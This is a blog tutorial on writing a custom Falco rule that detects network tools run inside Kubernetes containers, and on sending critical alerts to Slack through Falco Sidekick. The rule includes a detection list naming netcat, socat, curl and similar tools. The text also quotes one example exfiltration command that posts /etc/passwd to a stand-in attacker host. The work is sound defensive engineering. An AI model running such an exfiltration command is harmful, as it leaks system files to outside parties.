---
title: "Falco rules and sidekick: alerting on runtime anomalies in production"
author: Victor Silva
date: 2025-11-10T22:37:56+00:00
layout: post
permalink: /falco-rules-sidekick-alerting/
excerpt: "Default Falco rules get you started, but production clusters need detection tuned to your workloads. This post goes deep on writing custom Falco rules, understanding rule anatomy, and wiring Falco Sidekick to deliver real-time Slack alerts when something suspicious happens at runtime."
categories:
  - Kubernetes Security
tags:
  - falco
  - falco-sidekick
  - kubernetes
  - runtime-security
  - cncf
  - alerting
  - slack
---

You deployed Falco, watched the default rules fire a few times, and called it done. Then, two weeks later, an incident review reveals that a compromised workload was reading service account tokens for four hours before anyone noticed. The events were there in Falco's logs - they just never made it to anyone's attention.

Detection without alerting is logging. Alerting without tuned rules is noise. The gap between running Falco and actually acting on what it finds is exactly what this post closes.

This is a follow-up to the [Falco runtime security introduction](/falco-runtime-security-kubernetes/) I wrote earlier. That post covered installing Falco with the `modern-ebpf` driver and writing a first pair of custom rules. Here we go deeper: we look at how rule conditions are composed, write a custom rule from scratch for a specific threat scenario, install and configure Falco Sidekick as the alert routing layer, and test the entire chain end-to-end so you see a real Slack notification land when the rule fires.

## How Falco Rules Actually Work

Before writing a new rule, it is worth understanding the full anatomy of one. Every Falco rule is a YAML document with these fields:

- `rule` - the unique rule name, used in output and Sidekick event payloads
- `desc` - a human-readable description of what the rule detects
- `condition` - a boolean expression evaluated against each syscall event; the rule fires when this is true
- `output` - a format string that renders the alert message, referencing event fields with `%field.name` syntax
- `priority` - the severity level: `DEBUG`, `INFO`, `NOTICE`, `WARNING`, `ERROR`, `CRITICAL`, or `ALERT`
- `tags` - a list of arbitrary labels, commonly used for MITRE ATT&CK identifiers and Falco's own taxonomy

The `condition` field is where the work happens. Falco exposes hundreds of event fields: process name (`proc.name`), command line (`proc.cmdline`), file descriptor path (`fd.name`), container image (`container.image.repository`), Kubernetes pod name (`k8s.pod.name`), namespace (`k8s.ns.name`), and many more. You combine these with macros - reusable condition fragments defined in the rules file - and with lists.

The default rules file ships with macros like `spawned_process` (a new process was execve'd), `open_read` (a file was opened for reading), and `container` (the event happened inside a container). These save you from writing low-level syscall conditions by hand and make your custom rules readable.

Here is the general shape of a rule that detects an uncommon binary execution inside a container:

{% highlight yaml %}
- rule: Unexpected Binary Executed in Container
  desc: A binary not in the known-good list was executed inside a container
  condition: >
    spawned_process and container
    and not proc.name in (allowed_binaries)
  output: >
    Unexpected binary executed
    (user=%user.name binary=%proc.name cmdline=%proc.cmdline
    pod=%k8s.pod.name ns=%k8s.ns.name image=%container.image.repository)
  priority: WARNING
  tags: [container, process, T1059]

- list: allowed_binaries
  items: [nginx, node, python3, java]
{% endhighlight %}

The `>` block scalar in YAML folds the multi-line condition into a single string, which is how you keep long conditions readable in a values file.

## The Rule We Are Writing

For this post we will build a rule targeting a specific attacker behavior: running a network reconnaissance tool inside a container. Tools like `curl`, `wget`, `nmap`, and `nc` have legitimate uses in developer images and debug sidecars, but when they appear inside a production application container - especially after a suspicious file access - that is a signal worth routing to your security channel immediately.

The detection goal: fire at `CRITICAL` priority when any of these binaries executes inside a container whose image is not on an allowlist. Include enough context in the output to act on the alert without needing to dig through logs.

## Prerequisites

To follow along you will need:

- A Kubernetes cluster running 1.25 or higher with Falco already installed via Helm
- Helm 3 configured against the cluster
- `kubectl` with cluster-admin access to the `falco` namespace
- A Slack workspace where you have permission to create an incoming webhook

If you do not have Falco installed yet, follow the installation steps in the [intro post](/falco-runtime-security-kubernetes/) first. This post assumes you have a working `falco-values.yaml` and the `falcosecurity` Helm repo added.

Verify Falco is running:

{% highlight bash %}
kubectl rollout status daemonset/falco -n falco
kubectl get pods -n falco
{% endhighlight %}

Both commands should return cleanly. If you see the Sidekick deployment already present from a previous install, we will update its configuration in place - no need to reinstall.

## Writing the Custom Rule

Open your `falco-values.yaml` and locate the `customRules` block. If it does not exist yet, add it at the top level. The rule below detects network reconnaissance tool execution inside containers:

{% highlight yaml %}
customRules:
  custom_rules.yaml: |-
    - list: recon_binaries
      items:
        - curl
        - wget
        - nmap
        - nc
        - ncat
        - netcat
        - masscan
        - socat
        - tcpdump

    - list: debug_images
      items: []

    - rule: Network Recon Tool Executed in Container
      desc: >
        A network reconnaissance or exfiltration binary was executed inside
        a running container. This may indicate post-exploitation activity
        following an initial access event.
      condition: >
        spawned_process and container
        and proc.name in (recon_binaries)
        and not container.image.repository in (debug_images)
      output: >
        Network recon tool executed in container
        (user=%user.name binary=%proc.name args=%proc.args
        pod=%k8s.pod.name ns=%k8s.ns.name
        image=%container.image.repository
        parent=%proc.pname)
      priority: CRITICAL
      tags: [container, network, recon, T1046, T1041]
{% endhighlight %}

A few things to call out in this rule.

`proc.args` captures the arguments passed to the binary, not just its name. When an attacker runs `curl https://attacker.example.com/exfil -d @/etc/passwd`, you want to see that URL in the alert - not just `curl`.

`proc.pname` is the parent process name. If `curl` was spawned by `bash`, which was itself spawned by a shell injection, that ancestry appears in the output and is a strong indicator of exploitation rather than a legitimate use.

The `debug_images` list is intentionally empty. As you tune the rule in your environment, you will add image repository prefixes for legitimate debug or tooling containers. Keep this list minimal and review it periodically - an overly permissive allowlist defeats the detection entirely.

The `CRITICAL` priority means this rule will route to any Sidekick output configured with `minimumpriority: critical` or lower. We will leverage that in the next section.

## Installing and Configuring Falco Sidekick

Sidekick is the fan-out layer between Falco's HTTP output and your alert destinations. It picks up every JSON event Falco emits, evaluates the priority against each output's minimum threshold, and dispatches to any matching destinations. A single Falco event can simultaneously go to Slack, PagerDuty, and an S3 archive if that is what you need.

### Creating the Slack Webhook Secret

Do not put your Slack webhook URL in `falco-values.yaml`. That file gets committed to your GitOps repository and the URL ends up in Helm's release history in plain text. Store it in a Kubernetes Secret instead:

{% highlight bash %}
kubectl create secret generic falco-sidekick-slack \
  --from-literal=slackWebhookURL="https://hooks.slack.com/services/YOUR/WEBHOOK/URL" \
  -n falco
{% endhighlight %}

Replace the URL with your actual Slack incoming webhook. You can create one at `https://api.slack.com/apps` by selecting your workspace, adding a new app with the "Incoming Webhooks" feature enabled, and copying the generated URL.

Verify the secret was created:

{% highlight bash %}
kubectl get secret falco-sidekick-slack -n falco
{% endhighlight %}

### Updating the Helm Values

Now update your `falco-values.yaml` to enable Sidekick with Slack output and wire the secret. The Sidekick section of the values file should look like this:

{% highlight yaml %}
falcosidekick:
  enabled: true
  webui:
    enabled: true
  config:
    slack:
      webhookurl: ""
      channel: "#falco-alerts"
      minimumpriority: "critical"
      messageformat: |
        {"text": "*[{% raw %}{{.Priority}}{% endraw %}] {% raw %}{{.Rule}}{% endraw %}*\n```{% raw %}{{.Output}}{% endraw %}```\n*Source:* {% raw %}{{.Source}}{% endraw %} | *Time:* {% raw %}{{.Time}}{% endraw %}"}
    customfields: "cluster:prod,env:production"
  existingSecret: falco-sidekick-slack
{% endhighlight %}

The `webhookurl` is deliberately empty here - Sidekick reads the actual URL from the `existingSecret` reference, which maps the secret key `slackWebhookURL` to the Sidekick environment variable `SLACK_WEBHOOKURL` internally. The `channel` value overrides the default channel configured on the webhook app, which is useful when you want different rules to route to different channels - you can add a second Sidekick output config block with a different `minimumpriority` pointing at a `#falco-warning` channel, for example.

Setting `minimumpriority: critical` means only `CRITICAL` and `ALERT` priority events go to Slack. This keeps the channel clean. Lower-priority rules still generate events that the web UI shows and that your SIEM webhook receives - they just do not page anyone.

The `messageformat` block customizes how Sidekick renders the Slack message. The template variables `{% raw %}{{.Priority}}{% endraw %}`, `{% raw %}{{.Rule}}{% endraw %}`, `{% raw %}{{.Output}}{% endraw %}`, `{% raw %}{{.Source}}{% endraw %}`, and `{% raw %}{{.Time}}{% endraw %}` are substituted from the Falco event at dispatch time. The default format works fine, but a custom format that bolds the rule name and wraps the output in a code block makes the messages noticeably easier to scan in a busy Slack channel.

### Applying the Changes

Run the Helm upgrade with the updated values:

{% highlight bash %}
helm upgrade falco falcosecurity/falco \
  --namespace falco \
  --reuse-values \
  -f falco-values.yaml
{% endhighlight %}

The `--reuse-values` flag merges your file over the existing release values rather than replacing them, which is safer than a full re-install. Wait for the rollout to complete:

{% highlight bash %}
kubectl rollout status daemonset/falco -n falco
kubectl rollout status deployment/falco-falcosidekick -n falco
{% endhighlight %}

Check that Sidekick started cleanly and loaded the Slack configuration:

{% highlight bash %}
kubectl logs -n falco deployment/falco-falcosidekick | grep -i slack
{% endhighlight %}

You should see a log line confirming the Slack output is enabled. If you see an error about a missing webhook URL, verify the secret exists and the key name matches exactly.

## Testing and Validation

With Falco running and Sidekick configured, let's fire the rule intentionally and trace the event from syscall to Slack message.

Deploy a test pod running a standard application image - one that should never legitimately run `curl` in your environment:

{% highlight bash %}
kubectl run falco-recon-test \
  --image=nginx:1.27 \
  --restart=Never \
  -- sleep 3600
{% endhighlight %}

Wait for the pod to reach Running state:

{% highlight bash %}
kubectl get pod falco-recon-test -w
{% endhighlight %}

Open a second terminal and start tailing the Falco logs:

{% highlight bash %}
kubectl logs -n falco daemonset/falco -f | grep "Network recon"
{% endhighlight %}

Now trigger the rule by executing `curl` inside the container:

{% highlight bash %}
kubectl exec falco-recon-test -- curl -s https://example.com
{% endhighlight %}

Within a second or two, your tail should produce output like this:

```
{"output":"Network recon tool executed in container (user=root binary=curl args=-s https://example.com pod=falco-recon-test ns=default image=nginx parent=runc:[2:INIT])","priority":"CRITICAL","rule":"Network Recon Tool Executed in Container","source":"syscall","tags":["T1041","T1046","container","network","recon"],"time":"2025-11-10T10:04:23.112Z"}
```

The event includes the arguments (`-s https://example.com`) and the parent process (`runc:[2:INIT]`), exactly as the rule output defined.

Now verify that Sidekick forwarded it to Slack:

{% highlight bash %}
kubectl logs -n falco deployment/falco-falcosidekick | grep -E "Slack|slack"
{% endhighlight %}

You should see a line with `Slack` and an HTTP 200 response code, confirming the webhook call succeeded. Check your Slack channel - the message should have arrived with the rule name bolded and the full output in a code block.

You can also verify via the Sidekick web UI. Forward it locally:

{% highlight bash %}
kubectl port-forward -n falco svc/falco-falcosidekick-ui 2802:2802
{% endhighlight %}

Opening `http://localhost:2802` shows you a dashboard with event counts by priority and a searchable event log. The `CRITICAL` event from our test should appear at the top of the timeline.

Clean up the test pod when you are done:

{% highlight bash %}
kubectl delete pod falco-recon-test
{% endhighlight %}

## Best Practices

**Use `override: append` to tune noisy default rules, not to disable them.** When a default rule fires for a legitimate process in your environment, the temptation is to disable the rule. That creates a permanent blind spot. Instead, append an exception using the `override` mechanism:

{% highlight yaml %}
- rule: Read sensitive file untrusted
  override:
    condition: append
    value: and not proc.name in (my_legitimate_reader)
{% endhighlight %}

The rule stays active for everything else. Review your `override` blocks quarterly to ensure the exceptions still make sense.

**Route by priority, not by rule.** Rather than configuring Sidekick with a rule-level filter, use the `minimumpriority` setting on each output to route by severity. `CRITICAL` and `ALERT` go to Slack and PagerDuty. `WARNING` and `ERROR` go to your SIEM webhook. `DEBUG` and `INFO` go to an S3 archive or nowhere. This scales naturally as you add new rules - you set the priority in the rule and the routing just works.

**Tag every custom rule with MITRE ATT&CK identifiers.** The tags in our rule (`T1046`, `T1041`) flow through to Sidekick's output and your SIEM. When you are doing an incident review six months from now and correlating Falco events with other detection data, those tags are the connective tissue between your runtime alerts and your threat model. Make it a habit.

**Monitor Falco's own health.** Falco exposes a Prometheus metrics endpoint that includes `falco_events_dropped_total`. If this counter rises on a busy node, Falco is falling behind on syscall processing and dropping events - which means blind spots. Add an alert on this metric. If you see drops, increase `syscall_buf_size_preset` in your Falco configuration (the default is `4`; the range is `1` to `8`) and watch node memory consumption after the change.

**Test rules in a non-production namespace before enforcing broadly.** The `container.image.repository` condition in our rule is the main tuning knob. Before rolling this rule out cluster-wide, run it for a few days with output only (no Sidekick Slack routing, just the Sidekick UI and logs) in a staging namespace. See what legitimate tooling fires it. Build your `debug_images` allowlist from observed data, not assumptions.

## Conclusion

Running Falco with default rules gives you coverage. Running Falco with custom rules tuned to your threat model and wiring Sidekick to route critical alerts to where engineers actually look - that gives you a detection pipeline worth trusting.

In this post we wrote a custom rule targeting network reconnaissance tools executed inside containers, mapped it to MITRE ATT&CK techniques, configured Falco Sidekick with Slack output backed by a Kubernetes Secret, and validated the full chain from `kubectl exec` to a Slack message. Falco is a CNCF graduated project with an active ecosystem and a growing library of community rules - the detection surface you can cover with it goes well beyond what we built here.

From here, the natural next steps are adding more rules for your specific workloads, wiring a second Sidekick output to your SIEM, and building a runbook tied to each rule so your on-call team knows what to do when an alert fires at 2 AM.

Happy scripting!
